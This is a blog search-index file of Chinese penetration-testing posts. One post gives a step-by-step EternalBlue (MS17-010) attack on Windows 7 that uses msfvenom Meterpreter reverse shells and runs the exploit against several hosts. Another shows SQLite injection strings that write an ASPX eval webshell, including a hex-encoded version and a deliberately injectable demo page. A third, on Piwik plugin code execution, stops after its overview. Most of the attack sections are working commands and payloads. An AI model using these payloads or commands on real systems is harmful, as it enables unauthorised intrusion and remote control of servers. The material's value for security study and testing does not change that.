@@ -1,0 +1,1085 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+    
+    <entry>
+      <title><![CDATA[使用PentestBox工具利用ETERNALBLUE对Win7进行攻击，获取Meterpreter反弹]]></title>
+      <url>/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/</url>
+      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>MS17-010已经过去很久了，利用PentestBox的方式也提到过，但都是基于python2.6那种方式实现的。本文将使用<a href="https://github.com/worawit/MS17-010" target="_blank" rel="external">Sleepya
+</a>的脚本利用ETERNALBLUE来实现对Win7进行攻击，从而获取Meterpreter反弹。<br><a id="more"></a></p>
+<p>靶机为Windows 7，IP为192.168.131.133。攻击机为Win10系统，安装了PentestBox，IP为192.168.217.1。<br>脚本下载地址：<a href="https://github.com/worawit/MS17-010" target="_blank" rel="external">https://github.com/worawit/MS17-010</a></p>
+<h3 id="漏洞利用测试"><a href="#漏洞利用测试" class="headerlink" title="漏洞利用测试"></a>漏洞利用测试</h3><h4 id="1-安装NASM"><a href="#1-安装NASM" class="headerlink" title="1.安装NASM"></a>1.安装NASM</h4><p>下载地址：<a href="http://www.nasm.us/pub/nasm/releasebuilds/" target="_blank" rel="external">http://www.nasm.us/pub/nasm/releasebuilds/</a> ，我这里用的是<a href="http://www.nasm.us/pub/nasm/releasebuilds/2.13.01/win64/nasm-2.13.01-installer-x64.exe" target="_blank" rel="external">2.13</a>。<br>然后开始安装。</p>
+<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/安装NASM.jpg" alt="安装NASM"></p>
+<p>安装完成后加入环境变量。</p>
+<h4 id="2-下载利用脚本，并编译内核shellcode"><a href="#2-下载利用脚本，并编译内核shellcode" class="headerlink" title="2.下载利用脚本，并编译内核shellcode"></a>2.下载利用脚本，并编译内核shellcode</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/worawit/MS17-010</div></pre></td></tr></table></figure>
+<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/下载脚本.jpg" alt="下载脚本"></p>
+<p>编译内核shellcode</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> MS17-010/shellcode/</div><div class="line">nasm <span class="_">-f</span> bin eternalblue_kshellcode_x64.asm</div><div class="line">nasm <span class="_">-f</span> bin eternalblue_kshellcode_x86.asm</div></pre></td></tr></table></figure>
+<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/编译ASM文件.jpg" alt="编译ASM文件"></p>
+<h4 id="3-生成反弹exp"><a href="#3-生成反弹exp" class="headerlink" title="3.生成反弹exp"></a>3.生成反弹exp</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp  EXITFUNC=thread LHOST=192.168.217.1 LPORT=4445 <span class="_">-f</span> raw -o ../../Git/MS17-010/shellcode/sc_x86_msf.bin</div><div class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp  EXITFUNC=thread LHOST=192.168.217.1 LPORT=4444 <span class="_">-f</span> raw -o ../../Git/MS17-010/shellcode/sc_x64_msf.bin</div></pre></td></tr></table></figure>
+<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/生成反弹exp.jpg" alt="生成反弹exp"></p>
+<h4 id="4-合并SHELLCODE"><a href="#4-合并SHELLCODE" class="headerlink" title="4.合并SHELLCODE"></a>4.合并SHELLCODE</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cat eternalblue_kshellcode_x64 sc_x64_msf.bin &gt; sc_x64.bin</div><div class="line">cat eternalblue_kshellcode_x86 sc_x86_msf.bin &gt; sc_x86.bin</div><div class="line">python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin</div></pre></td></tr></table></figure>
+<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/合并SHELLCODE.jpg" alt="合并SHELLCODE"></p>
+<h4 id="5-开启Metasploit并监听"><a href="#5-开启Metasploit并监听" class="headerlink" title="5.开启Metasploit并监听"></a>5.开启Metasploit并监听</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler</div><div class="line">msf exploit(handler) &gt; <span class="built_in">set</span> ExitOnSession <span class="literal">false</span></div><div class="line">msf exploit(handler) &gt; <span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; <span class="built_in">set</span> EXITFUNC thread</div><div class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LHOST 192.168.217.1</div><div class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LPORT 4444</div><div class="line">msf exploit(handler) &gt; exploit -j</div><div class="line">...</div><div class="line">msf exploit(handler) &gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LPORT 4445</div><div class="line">msf exploit(handler) &gt; exploit -j</div></pre></td></tr></table></figure>
+<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/开启监听.jpg" alt="开启监听"></p>
+<h4 id="6-进行攻击"><a href="#6-进行攻击" class="headerlink" title="6.进行攻击"></a>6.进行攻击</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python eternalblue_exploit7.py 192.168.131.133 shellcode\sc_all.bin</div></pre></td></tr></table></figure>
+<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/利用生成的脚本攻击.jpg" alt="利用生成的脚本攻击"></p>
+<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/攻击结果.jpg" alt="攻击结果"><br>看到已经获取Meterpreter反弹。</p>
+<h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>在PentestBox中运行一些命令时(如msfconsole)，提示<code>不是内部或外部命令，也不是可运行的程序或批处理文件。</code><br>解决方法：输入<code>cmd</code>之后再输入需要执行的命令。<br><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/问题1.jpg" alt="问题1"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1.这种方式利用稍微简单点，不需要过多的命令，而且生成的SHELLCODE也具有复用性。<br>2.在以上的操作中，均生成了32位和64位的shellcode，最后利用eternalblue_sc_merge脚本合并到一起。然后在Eternalblue漏洞中利用合并的shellcode可以支持x86和x64，无需再检测目标体系结构。<br>3.在使用中设置了线程，可以同时对多个系统进行攻击测试。<br>例如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">python eternalblue_exploit7.py 192.168.131.133 shellcode\sc_all.bin</div><div class="line">python eternalblue_exploit7.py 192.168.131.134 shellcode\sc_all.bin</div><div class="line">python eternalblue_exploit7.py 192.168.131.135 shellcode\sc_all.bin</div><div class="line">python eternalblue_exploit7.py 192.168.131.136 shellcode\sc_all.bin</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/多个攻击.jpg" alt="多个攻击"><br>攻击结果：<br><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/多个攻击结果.jpg" alt="多个攻击结果"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[1]<a href="https://github.com/worawit/MS17-010" target="_blank" rel="external">https://github.com/worawit/MS17-010</a><br>[2]<a href="https://www.exploit-db.com/docs/42280.pdf" target="_blank" rel="external">https://www.exploit-db.com/docs/42280.pdf</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> Exploit </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> MS17-010 </tag>
+            
+            <tag> PentestBox </tag>
+            
+            <tag> Metasploit </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[SQLite手工注入Getshell技巧]]></title>
+      <url>/2017/07/19/SQLite-Injection-Get-WebShell/</url>
+      <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p><a href="http://www.sqlite.org/" target="_blank" rel="external">SQLite</a>是一种嵌入式数据库，它的数据库就是一个文件。由于SQLite本身是C写的，而且体积很小，所以经常被集成到各种应用程序中，主要在手机的App中使用。<br>之前没有遇到过关于SQLite的注入，这次遇到一个在ASPX中使用SQLite数据库，并且存在注入。这篇文章将主要介绍一下从注入到获取WEBSHELL的过程和遇到的一些坑。<br>首先介绍一下SQLite的使用方法，然后在本地搭建环境以及利用注入获取WEBSHELL，最后将讲述在实际应用中遇到的问题以及如何解决（e.g.手工注入写shell）。</p>
+<a id="more"></a>
+<h3 id="0x02-SQLite的使用"><a href="#0x02-SQLite的使用" class="headerlink" title="0x02 SQLite的使用"></a>0x02 SQLite的使用</h3><p>SQLite 的一个重要的特性是零配置的，这意味着不需要复杂的安装或管理。在 Windows 上使用SQLite时访问  <a href="http://www.sqlite.org/download.html" target="_blank" rel="external">SQLite下载页面</a>，从 Windows 区下载预编译的二进制文件。现在最新的为<a href="http://www.sqlite.org/2017/sqlite-tools-win32-x86-3190300.zip" target="_blank" rel="external">sqlite-tools-win32-x86-3190300.zip</a>，下载下来后解压。我这里将其中的文件复制到<code>D:\sqlite</code>目录。</p>
+<p>SQLite的语法和其他数据库差不多，只不过SQLite的数据库是一个单独的文件。SQLite创建数据库的方法有两种，一种是创建，另外一种是附加。</p>
+<p>创建使用命令：<code>sqlite3.exe 数据库文件名</code>。例如创建一个名字为aa.db的数据库，使用命令：<code>sqlite3.exe aa.db</code>。</p>
+<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/创建数据库.jpg" alt="创建数据库"></p>
+<p>附加数据库的基本语法是：<code>ATTACH DATABASE &#39;DatabaseName&#39; As &#39;Alias-Name&#39;;</code>。如果数据库尚未被创建，这个命令将创建一个数据库，如果数据库已存在，则把数据库文件名称与逻辑数据库 ‘Alias-Name’ 绑定在一起。例如附加一个bb.db的数据库，别名为a，命令为：<code>attach database &#39;d:\\sqlite\\bb.db&#39; as &#39;a&#39;;</code>。</p>
+<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/附加数据库.jpg" alt="附加数据库"></p>
+<p>创建表并插入数据的命令如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> a.tt(dataz <span class="built_in">text</span>); <span class="keyword">INSERT</span> <span class="keyword">into</span> a.tt(dataz) <span class="keyword">VALUES</span> (<span class="string">'test'</span>);</div></pre></td></tr></table></figure>
+<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/创建表查询.jpg" alt="创建表查询"></p>
+<p>SQLite还可以生成任意后缀名的数据库文件。例如创建一个php结尾的数据库文件，新建一个名为exp的表，并在其中插入数据，内容为：<code>&lt;?php phpinfo();?&gt;</code>。</p>
+<p>具体命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlite&gt;ATTACH DATABASE <span class="string">'d:\\sqlite\\23.php'</span> AS <span class="built_in">test</span> ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES (<span class="string">'&lt;?php phpinfo();?&gt;'</span>);--</div></pre></td></tr></table></figure>
+<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/生成数据库格式为PHP.jpg" alt="生成数据库格式为PHP"></p>
+<p>将生成的数据库文件23.php放在web目录，然后访问。发现数据库中插入的数据竟被解析了。</p>
+<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/PHP解析.jpg" alt="PHP解析"></p>
+<p>同样的方法生成aspx后缀的数据库文件，创建表，并插入<code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</code>。然后将该文件放在IIS服务的web目录。发现其中的APSX代码也会被解析。</p>
+<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/ASPX格式数据库.jpg" alt="ASPX格式数据库"></p>
+<p>通过查看生成的数据库文件，发现其中表的内容都以原格式存储的，这就导致了表中的代码被解析的原因。接下来将在本地搭建一个ASPX+SQLite的web项目，演示一下如何通过SQL注入获取WEBSHELL。</p>
+<h3 id="0x03-本地环境搭建及获取SHELL"><a href="#0x03-本地环境搭建及获取SHELL" class="headerlink" title="0x03 本地环境搭建及获取SHELL"></a>0x03 本地环境搭建及获取SHELL</h3><p>因为在实际应用中遇到的是.Net开发的web项目，所以这里也以ASPX程序为例。</p>
+<h4 id="1-环境搭建和项目的部署"><a href="#1-环境搭建和项目的部署" class="headerlink" title="1.环境搭建和项目的部署"></a>1.环境搭建和项目的部署</h4><p>下载安装 <a href="https://sourceforge.net/projects/sqlite-dotnet2/" target="_blank" rel="external">Sqlite ADO.NET</a>，下载后直接安装即可。安装后将其中的System.Data.SQLite.DLL文件复制出来，在下面的项目中将会用到（分32和64位，根据自己的环境选择）。</p>
+<p>这里我采用VS2013，新建一个ASP.NET网站，在项目中新建一个Bin文件夹和一个ASPX页面（这里名称为Default.aspx)，将上面复制出来的System.Data.SQLite.DLL文件放在Bin目录中。</p>
+<p>其目录结构如图：</p>
+<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/项目目录结构.jpg" alt="项目目录结构"></p>
+<p>Default.aspx是显示页面，其中有一个文本框和按钮。主要代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"form1"</span> <span class="attr">runat</span>=<span class="string">"server"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">asp:TextBox</span> <span class="attr">ID</span>=<span class="string">"TextBox1"</span> <span class="attr">runat</span>=<span class="string">"server"</span>&gt;</span><span class="tag">&lt;/<span class="name">asp:TextBox</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">asp:Button</span> <span class="attr">ID</span>=<span class="string">"Button1"</span> <span class="attr">runat</span>=<span class="string">"server"</span> <span class="attr">OnClick</span>=<span class="string">"btn_Click"</span> <span class="attr">Text</span>=<span class="string">"查询"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>Default.aspx.cs是代码的实现，代码如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line">using System;</div><div class="line">using System.Collections.Generic;</div><div class="line">using System.Linq;</div><div class="line">using System.Web;</div><div class="line">using System.Web.UI;</div><div class="line">using System.Web.UI.WebControls;</div><div class="line">using System.Data.SQLite; </div><div class="line"></div><div class="line">public partial class _Default : System.Web.UI.Page</div><div class="line">&#123;</div><div class="line">    protected void Page_Load(object sender, EventArgs e)</div><div class="line">    &#123;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (!System.IO.File.Exists(Server.MapPath(<span class="string">"~"</span>) + <span class="string">"/UserData.dbx"</span>))</div><div class="line">        &#123;</div><div class="line">            SQLiteConnection.ClearAllPools();</div><div class="line">            SQLiteConnection.CreateFile(Server.MapPath(<span class="string">"~"</span>) + <span class="string">"/UserData.dbx"</span>);</div><div class="line">            SQLiteConnection conn = new SQLiteConnection(<span class="string">"Data Source="</span> + Server.MapPath(<span class="string">"~"</span> + <span class="string">"/UserData.dbx"</span>));</div><div class="line">            conn.Open();</div><div class="line">            SQLiteCommand cmd = new SQLiteCommand();</div><div class="line">            cmd.CommandText = <span class="string">"create table Users (UserID int primary key,UserName varchar(100) not null,UserPassword varchar(100) not null)"</span>;</div><div class="line">            cmd.Connection = conn;</div><div class="line">            cmd.ExecuteNonQuery();</div><div class="line">            <span class="keyword">for</span> (int i = 0; i &lt; 100; i++)</div><div class="line">            &#123;</div><div class="line">                cmd.CommandText = <span class="string">"insert into Users (UserID,UserName,UserPassword) values ("</span> + i + <span class="string">",'TestUser_"</span> + i + <span class="string">"','"</span> + DateTime.Now.ToString().Replace(<span class="string">" "</span>, <span class="string">"-"</span>).Replace(<span class="string">":"</span>, <span class="string">"-"</span>) + <span class="string">"')"</span>;</div><div class="line">                cmd.ExecuteNonQuery();</div><div class="line">            &#125;</div><div class="line">            conn.Clone();</div><div class="line">            conn.Dispose();</div><div class="line">            Response.Write(<span class="string">"初始化~~&lt;br /&gt;"</span>);</div><div class="line">        &#125;</div><div class="line">        Response.Write(<span class="string">"加载成功~~&lt;br /&gt;"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    protected void btn_Click(object sender, EventArgs e)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (TextBox1.Text != <span class="string">""</span>)&#123;</div><div class="line">            SQLiteConnection.ClearAllPools();</div><div class="line">            //SQLiteConnection.CreateFile(Server.MapPath(<span class="string">"~"</span>) + <span class="string">"/UserData.dbx"</span>);</div><div class="line">            SQLiteConnection conn = new SQLiteConnection(<span class="string">"Data Source="</span> + Server.MapPath(<span class="string">"~"</span> + <span class="string">"/UserData.dbx"</span>));</div><div class="line">            conn.Open();</div><div class="line">            SQLiteCommand cmd = new SQLiteCommand();</div><div class="line">            cmd.CommandText = <span class="string">"select UserPassword from Users where UserName='"</span> + TextBox1.Text.Trim()+<span class="string">"'"</span>;</div><div class="line">            cmd.Connection = conn;</div><div class="line"></div><div class="line">            <span class="keyword">if</span> (cmd.ExecuteScalar() != null)</div><div class="line">            &#123;</div><div class="line">                string tempUserName = cmd.ExecuteScalar().ToString();</div><div class="line">                Response.Write(<span class="string">"查询结果为:"</span> + tempUserName + <span class="string">"&lt;br /&gt;&lt;br /&gt;"</span>);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span></div><div class="line">            &#123;</div><div class="line">                Response.Write(<span class="string">"无此用户"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            Response.Write(<span class="string">"请输入查询内容~~&lt;br /&gt;"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>然后将项目部署即可，这就是一个存在注入的项目。接下来就是利用注入来获取WEBSHELL。</p>
+<h4 id="2-SQL注入写WEBSHELL"><a href="#2-SQL注入写WEBSHELL" class="headerlink" title="2.SQL注入写WEBSHELL"></a>2.SQL注入写WEBSHELL</h4><p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/项目部署.jpg" alt="项目部署"></p>
+<p>当输入<code>&#39;</code>时，项目报错，同时将web绝对路径暴露出来。</p>
+<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/报错.jpg" alt="报错"></p>
+<p>然后就根据上面SQLite创建ASPX格式的数据库的方式来写入一个WEBSHELL。</p>
+<p>其语句为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">';ATTACH DATABASE '</span>c:\\WebSite\\css.aspx<span class="string">' AS pwn ;create TABLE pwn.exp (dataz text) ; insert INTO pwn.exp (dataz) VALUES ('</span>&lt;%@ Page Language=<span class="string">"Jscript"</span>%&gt;&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">"pass"</span>],<span class="string">"unsafe"</span>);%&gt;<span class="string">'); --</span></div></pre></td></tr></table></figure>
+<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/测试环境写shell.jpg" alt="测试环境写shell"></p>
+<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/测试环境成功写入SHELL.jpg" alt="测试环境成功写入SHELL"></p>
+<p>测试环境很顺利就通过SQL注入写入了WEBSHELL，但是在实际测试中并非如此顺利。接下来看看在实际应用中遇到的问题以及解决的方法。</p>
+<h3 id="0x04-实际中应用中遇到的问题及解决方法"><a href="#0x04-实际中应用中遇到的问题及解决方法" class="headerlink" title="0x04 实际中应用中遇到的问题及解决方法"></a>0x04 实际中应用中遇到的问题及解决方法</h3><p>已知：该系统存在SQL注入，数据库为SQLite，通过报错发现web项目的绝对路径。后台存在弱口令，后台可以上传图片格式文件。</p>
+<p>直接利用SQLite写aspx文件时，发现可以写入成功，但是SHELL没有执行。无法判断是shell代码未写入成功还是未执行成功。然后就先写个TXT查看shell代码是否可以写入成功。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">';ATTACH DATABASE '</span>d:\\********\\web\\24.txt<span class="string">' AS pwn ;create TABLE pwn.exp (dataz text) ; insert INTO pwn.exp (dataz) VALUES ('</span>&lt;%@ Page Language=<span class="string">"Jscript"</span>&gt;&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">"pass"</span>],<span class="string">"unsafe"</span>);%&gt;<span class="string">'); --</span></div></pre></td></tr></table></figure>
+<p>然后直接访问根目录下的24.txt文件即可下载，下载后用SQLite数据库管理工具打开，这里用的是Navicat。</p>
+<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/24txt.jpg" alt="24txt"></p>
+<p>打开发现竟然是空的。然而将shell代码替换为字符串<code>test</code>时可以写入成功。那应该就是写入的SHELL中含有一些符号所致，这里尝试了转义都未能解决。</p>
+<p>由于可以找到图片上传的入口，所以有这样一个思路：在本地生成一个格式为jpg的数据库文件，创建表并写入SHELL，然后上传到服务器；在网站上利用注入新建一个txt格式的数据库，创建表后将图片格式数据库的内容插入到txt格式数据库中。</p>
+<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/生成图片格式马.jpg" alt="生成图片格式马"></p>
+<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/恢复数据库1.jpg" alt="恢复数据库1"></p>
+<p>提示数据库编码不一致，那就换另外一种方法。首先在web根目录生成一个jpg格式的数据库，创建表后下载；在本地打开后插入数据，之后上传到服务器；再在网站新建一个ASPX格式的数据库，创建表后将图片格式数据库的内容插入到ASPX格式数据库中。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">';ATTACH DATABASE '</span>d:\\********\\web\\fp.jpg<span class="string">' AS pwn;create TABLE pwn.exp(dataz text);--</span></div></pre></td></tr></table></figure>
+<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/服务器生成图片数据库.jpg" alt="服务器生成图片数据库"></p>
+<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/恢复数据库2.jpg" alt="恢复数据库2"></p>
+<p>可以成功写入，但访问发现插入的ASPX代码被原样输出，SHELL未执行成功。然后来对比一下在web上生成和本地生成的文件有什么区别。</p>
+<p>分别在本地和web上生成一个txt格式的数据库文件，新建表后插入<code>test</code>。然后对比其内容：</p>
+<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/数据内容对比.jpg" alt="数据内容对比"></p>
+<p>对比后发现网站生成的内容都多了一个空格。</p>
+<p>有同事提议说用十六进制试试，然后将shell内容转换为十六进制后插入。然而在web上测试失败。</p>
+<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/web十六进制写SHELL1.jpg" alt="web十六进制写SHELL1"></p>
+<p>本地测试也失败。</p>
+<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/本地十六进制写文件.jpg" alt="本地十六进制写文件"></p>
+<p>经过搜索发现，SQLite中十六进制的写法为：<code>x&#39;....&#39;</code>，而不是<code>0x....</code>。</p>
+<p>例如<code>&lt;%@ Page Language=&quot;Jscript&quot;&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</code>在SQLite中的十六进制表示为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">x<span class="string">'3c25402050616765204c616e67756167653d224a736372697074223e3c256576616c28526571756573742e4974656d5b2270617373225d2c22756e7361666522293b253e'</span></div></pre></td></tr></table></figure></p>
+<p>成功写入shell</p>
+<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/十六进制写shell.jpg" alt="十六进制写shell"></p>
+<p>菜刀连接：</p>
+<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/shell写入成功.jpg" alt="shell写入成功"></p>
+<h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>通过以上的测试过程和实际利用，可以归纳两点：</p>
+<p>1.SQLite可以创建任意格式的数据库文件，并且插入的代码可以根据文件格式来解析，这就造成了可以利用这种方式写WEBSHELL的原因。<br>2.SQLite中十六进制的写法为：<code>x&#39;....&#39;</code>，而不是<code>0x....</code>。</p>
+<h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><p>[1]<a href="http://www.cnblogs.com/xiaozi/p/5760321.html" target="_blank" rel="external">http://www.cnblogs.com/xiaozi/p/5760321.html</a><br>[2]<a href="https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet" target="_blank" rel="external">https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet</a><br>[3]<a href="http://blog.csdn.net/mazhaojuan/article/details/7660657" target="_blank" rel="external">http://blog.csdn.net/mazhaojuan/article/details/7660657</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 渗透测试 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> WEBSHELL </tag>
+            
+            <tag> SQLite </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Piwik代码执行漏洞安全分析（附验证过程Getshell）]]></title>
+      <url>/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/</url>
+      <content type="html"><![CDATA[<h3 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h3><p><a href="https://piwik.org/" target="_blank" rel="external">Piwik</a>是一个PHP和MySQL的开放源代码的Web统计软件. 它给你一些关于你的网站的实用统计报告，比如网页浏览人数, 访问最多的页面, 搜索引擎关键词等等。</p>
+<p>Piwik拥有众多不同功能的插件，你可以添加新的功能或是移除你不需要的功能，Piwik同样可以安装在你的服务器上面，数据就保存在你自己的服务器上面。你可以非常容易的插入统计图表到你的博客或是网站抑或是后台的控制面板中。安装完成后，你只需将一小段代码放到将要统计的网页中即可。</p>
+<a id="more"></a>
+<p>在17年2月份<a href="https://firefart.at/post/turning_piwik_superuser_creds_into_rce/" target="_blank" rel="external">FireFart</a>报告了一个Piwik超级用户获取远程代码执行的漏洞。该漏洞通过利用构造插件，然后利用超级用户上传并激活，在激活插件时会执行插件中的PayLoad，从而获取shell。本文将介绍一下漏洞原理、环境的搭建、PayLoad的构造以及漏洞的复现过程，如有不足，请多多指教。</p>
